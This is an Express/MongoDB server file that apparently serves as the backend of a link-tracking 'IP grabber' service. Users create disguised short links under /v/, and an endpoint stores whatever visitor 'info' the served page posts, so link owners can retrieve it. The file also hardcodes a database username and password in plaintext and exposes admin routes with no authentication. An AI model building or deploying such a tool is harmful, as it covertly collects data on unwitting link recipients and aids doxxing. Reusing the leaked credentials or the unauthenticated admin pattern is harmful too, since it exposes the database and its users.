const express = require('express');
const mongoose = require('mongoose');
const crypto = require('crypto');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI).then(() => console.log("DB Connected"));

// Schemas
const userSchema = new mongoose.Schema({ name: String, uid: String, isBanned: { type: Boolean, default: false } });
const logSchema = new mongoose.Schema({ uid: String, data: Object, timestamp: { type: Date, default: Date.now } });
const urlSchema = new mongoose.Schema({ slug: String, uid: String, type: String });

const User = mongoose.model('User', userSchema);
const Log = mongoose.model('Log', logSchema);
const UrlStore = mongoose.model('UrlStore', urlSchema);

const SERVER_URL = "https://ipdx.onrender.com";
setInterval(() => { axios.get(`${SERVER_URL}/ping`).catch(() => {}); }, 300000);
app.get('/ping', (req, res) => res.send("Active"));

// Register: 11-char ID
app.post('/register', async (req, res) => {
    const uid = crypto.randomBytes(6).toString('hex').slice(0, 11);
    const newUser = new User({ name: req.body.name, uid: uid });
    await newUser.save();
    res.json({ name: req.body.name, uid: uid });
});

app.post('/create-url', async (req, res) => {
    const { uid, isCustom, slug } = req.body;
    const finalSlug = isCustom ? slug : `gen-${crypto.randomBytes(3).toString('hex')}`;
    await UrlStore.create({ slug: finalSlug, uid, type: isCustom ? 'custom' : 'random' });
    res.json({ url: `${SERVER_URL}/v/${finalSlug}` });
});

app.post('/remove-custom', async (req, res) => {
    await UrlStore.deleteMany({ uid: req.body.uid, type: 'custom' });
    res.json({ status: "Removed" });
});

app.post('/log-data', async (req, res) => {
    await Log.create({ uid: req.body.uid, data: req.body.info });
    res.sendStatus(200);
});

app.get('/get-logs/:uid', async (req, res) => {
    const logs = await Log.find({ uid: req.params.uid }).sort({ timestamp: -1 }).limit(1);
    res.json(logs);
});

app.get('/v/:slug', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });

// Admin
app.get('/admin/users', async (req, res) => res.json(await User.find()));
app.post('/admin/ban', async (req, res) => {
    await User.updateOne({ uid: req.body.uid }, { isBanned: true });
    res.json({ status: "Banned" });
});

app.listen(process.env.PORT || 3000);
